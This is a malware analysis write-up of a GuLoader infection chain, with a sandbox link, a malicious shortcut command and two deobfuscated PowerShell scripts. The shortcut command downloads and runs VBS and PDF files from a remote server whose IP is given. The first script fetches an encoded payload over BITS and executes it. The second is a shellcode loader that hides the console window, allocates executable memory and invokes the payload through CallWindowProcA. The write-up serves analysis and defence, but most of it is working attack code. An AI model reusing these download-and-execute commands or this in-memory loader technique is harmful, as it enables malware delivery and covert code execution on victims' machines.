# GuLoader Analysis

### Dynamic Analysis
https://tria.ge/230310-r1hssafh8w/behavioral2

### Malicious Shortcut Doc065754.lnk executes the following command

```
"C:\WINDOWS\System32\WScript.exe" "\\localhost\c$\Windows\System32\SyncAppvPublishingServer.vbs" n;
Invoke-WebRequest http[:]//0xC2.11808979/sara/Vejlensisk90.vbs -OutFile C:\Windows\Tasks\Tepoler.vbs; 
C:\Windows\Tasks\Tepoler.vbs; 
Invoke-WebRequest http[:]//0xC2.11808979/sara/info.pdf -OutFile C:\Users\Public\info1.pdf; 
C:\Users\Public\info1.pdf
```

### Remote webserver IP

`194.180.48.211`

### Vejlensisk90.vbs executes the following PS Script (deobfuscated) which downloads and loads another ps script

```ps
Function StringReplace ([String]$Eddikeb){
	For($Modemets=1; $Modemets -lt $Eddikeb.Length-1; $Modemets+=(1+1)){
		$mdeaftens=$mdeaftens+$Eddikeb.Substring($Modemets, 1);};
	$mdeaftens;
}

$URL='http[:]//194.180.48[.]211/zara/Dedepseud52.toc';
$IEX=iex;
$PSPath = '\syswow64\WindowsPowerShell\v1.0\powershell.exe';
IEX $windirpath=$env:windir;
IEX $PSPath='C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe';
IEX $GetCurrentProcessPath = ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split '"';
IEX $CleanArrayofPath = $GetCurrentProcessPath[$GetCurrentProcessPath.count-2];
IEX $Model=(Test-Path $PSPath) -And ([IntPtr]::size -eq 8);

if ($Model) {
	.$PSPath $CleanArrayofPath;
} else {
	$BitsTransfer=Start-BitsTransfer -Source $URL -Destination $FileOutPut;
	IEX $FileOutPut=$env:appdata ;
	IEX Import-Module BitsTransfer;
	$windirpath=$windirpath+'\Raao.pal';

	while (-not $Ifpathexists) {
		IEX $Ifpathexists=(Test-Path $FileOutPut);
		IEX $BitsTransfer;
		IEX Start-Sleep 5;
	}
	IEX $FileData = Get-Content $FileOutPut;
	IEX $Base64Decoded = [System.Convert]::FromBase64String($FileData);
	IEX $ByteArray = [System.Text.Encoding]::ASCII.GetString($Base64Decoded);
	IEX $psscript=$ByteArray.substring(188264,19335);
	IEX $psscript;
}
```

### An attempt at deobfuscating the second PowerShell script

```ps
Function Overgla02([String]$Ally) {
	$fjederbela = New-Object byte[] ($Ally.Length / 2)
	For($Kont=0; $Kont -lt $Ally.Length; $Kont+=2){
	$fjederbela[$Kont/2] = [convert]::ToByte($Ally.Substring($Kont, 2), 16)
	$fjederbela[$Kont/2] = ($fjederbela[$Kont/2] -bxor 253)
	}
	[String][System.Text.Encoding]::ASCII.GetString($fjederbela)
}

$systemdll='System.dll'
$UnsafeNativeMethods='Microsoft.Win32.UnsafeNativeMethods'
$GetProcAddress='GetProcAddress'
$HandleRef='System.Runtime.InteropServices.HandleRef'
$varstring='string'
$GetModuleHandle='GetModuleHandle'
$Seenrufle6='RTSpecialName, HideBySig, Public'
$Seenrufle7='Runtime, Managed'
$Seenrufle8='ReflectedDelegate'
$Seenrufle9='InMemoryModule'
$Reha0='MyDelegateType'
$Reha1='Class, Public, Sealed, AnsiClass, AutoClass'
$Reha2='Invoke'
$Reha3='Public, HideBySig, NewSlot, Virtual'
$Reha4='VirtualAlloc'
$ntdll='ntdll'
$NTProtectVirtualMemory='NtProtectVirtualMemory'
$IEX='IEX'
$Reha8='\'
$Persi='CallWindowProcA'

function Overgla05 ($Piratf, $Bematp) {
	IEX $Ladyfli = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split($Reha8)[-1].Equals($systemdll) }).GetType($UnsafeNativeMethods)
	$Domesti = $Ladyfli.GetMethod($GetProcAddress, [Type[]] @($HandleRef, $varstring))
	IEX return $Domesti.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($Ladyfli.GetMethod($GetModuleHandle)).Invoke($null, @($Piratf)))), $Bematp))
}

function Overgla04 {
	Param ([Parameter(Position = 0)] [Type[]] $Kale,[Parameter(Position = 1)] [Type] $Rejselo = [Void])
	IEX $Uforstaae = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName($Seenrufle8)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule($Seenrufle9, $false).DefineType($Reha0, $Reha1, [System.MulticastDelegate])
	IEX $Uforstaae.DefineConstructor($Seenrufle6, [System.Reflection.CallingConventions]::Standard, $Kale).SetImplementationFlags($Seenrufle7)
	IEX $Uforstaae.DefineMethod($Reha2, $Reha3, $Rejselo, $Kale).SetImplementationFlags($Seenrufle7)
	IEX return $Uforstaae.CreateType()   
}

$Predesi = 'kernel32'
$Interm='USER32'
$Overgla03 = 'GetConsoleWindow'
$Overgla00='ShowWindow'
IEX $Rifle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Overgla05 $Interm $Overgla00), (Overgla04 @([IntPtr], [UInt32]) ([IntPtr])))
IEX $Ocre = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Overgla05 $Predesi $Overgla03), (Overgla04 @([IntPtr]) ([IntPtr])))
IEX $Inds = $Ocre.Invoke(0)
IEX $Rifle.Invoke($Inds, 0)
IEX $Ensepulc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Overgla05 $Predesi $Reha4), (Overgla04 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$Stavefo = Overgla05 $ntdll $NTProtectVirtualMemory
IEX $Preexhibit3 = $Ensepulc.Invoke([IntPtr]::Zero, 656, 0x3000, 0x40)
IEX $Heppetil = $Ensepulc.Invoke([IntPtr]::Zero, 95285248, 0x3000, 0x4)
IEX [System.Runtime.InteropServices.Marshal]::Copy($Peloton, 0,  $Preexhibit3, 656)
IEX $Aggro73=188264-656
IEX [System.Runtime.InteropServices.Marshal]::Copy($Peloton, 656, $Heppetil, $Aggro73)
IEX $Firsa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Overgla05 $Interm $Persi), (Overgla04 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr])))
IEX $Firsa.Invoke($Preexhibit3,$Heppetil,$Stavefo,0,0)
```
